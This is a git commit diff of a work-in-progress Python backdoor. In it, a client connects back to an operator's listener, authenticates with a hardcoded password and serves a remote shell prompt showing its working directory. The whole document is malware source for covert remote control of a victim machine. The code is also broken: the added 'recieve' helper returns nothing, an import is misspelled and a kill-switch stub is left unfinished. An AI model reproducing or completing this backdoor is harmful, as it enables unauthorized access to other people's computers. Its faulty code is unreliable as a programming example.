6330911b25a89f598b9d1d73b09215379a4de381
cmplxapps <cmplxapps@gmail.com>
2021-01-19 18:25:30 -0800

    Current Progress 1/19/2021

--- backdoor/client.py
+++ backdoor/client.py
@@ -1,17 +1,26 @@
-import subprocess
+import subprocess, socket, os, threading
 import socket
 import os
+path = ''
+cwd = ''
+ip = 'null'
+port = 0
+def listenForKillSwitch():
+	kill = socket.socket(socket.AF_INET)
+def recieve(s, buff=1024):
+	global data
+	data = b''
+	while True:
+		packet = s.recv(buff)
+		data += packet
+		if len(packet) < buff:
+			break
 def cd(newdir):
 	global path, cwd
 	path = os.path.normpath(f'{path}/{newdir}')
 	cwd = os.path.abspath(path)
 while True:
 	try:
-		#IP-ENTRY
-		ip = socket.gethostname()
-		#PORT-ENTRY
-		port = 4001
-		#PASSWORD-ENTRY
 		pswd = 'password'
 		srvr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		path = '.'
@@ -24,12 +33,12 @@ while True:
 				continue
 		srvr.send(b'@LOGIN')
 		while True:
-			data = srvr.recv(1024).strip()
+			data = recieve(srvr)
 			msg = data.decode()
 			if msg == pswd:
 				srvr.send(b'@CONNECTED')
 				while True:
-					data = srvr.recv(1024)
+					data = recieve(srvr)
 					msg = data.decode()
 					if msg == '@CONFIRM-CONNECTION':
 						break
@@ -41,7 +50,7 @@ while True:
 				continue
 		while True:
 			srvr.send(bytes(f'@GET-INPUT#({cwd})> ', 'utf-8'))
-			data = srvr.recv(1024).strip()
+			data = recieve(srvr)
 			msg = data.decode()
 			if msg.find('@PRINT ') == 0 or msg.find('::p ') == 0:
 				print(msg[7:])
--- backdoor/listener.py
+++ backdoor/listener.py
@@ -2,6 +2,14 @@ import socket
 import json
 import os
 import subprocesses
+def recieve(s, buff=1024):
+	global data
+	data = b''
+	while True:
+		packet = s.recv(buff)
+		data += packet
+		if len(packet) < buff:
+			break
 def cd(newdir):
 	global path, cwd
 	path = os.path.normpath(f'{path}/{newdir}')
@@ -14,7 +22,7 @@ while True:
 	port = settings['port']
 	print('\n\n - Use \'@HELP\' or \'::?\' for a list of commands.')
 	print(' - Use \'@GO\' or \'::!\' to start listening for connections.')
-	print(' - Use \'@TERMINATE\' or \'::t\' to terminate the program')
+	print(' - Use \'@TERMINATE\' or \'::t\' to terminate the program\n\n')
 	while True:
 		usrin = input('>> ')
 		if usrin.find('@HELP') == 0 or usrin.find('::?') == 0:
@@ -30,14 +38,14 @@ while True:
 	client, addr = srvr.accept()
 	print(f'Connection from {addr} has been established...')
 	while True:
-		data = client.recv(1024).strip()
+		data = recieve(client)
 		msg = data.decode()
 		if msg == '@LOGIN':
 			while True:
 				login = input('Login: ')
 				data = bytes(login, 'utf-8')
 				client.send(data)
-				data = client.recv(1024).strip()
+				data = recieve(client)
 				msg = data.decode()
 				if msg == '@CONNECTED':
 					print('Connected to Backdoor...')
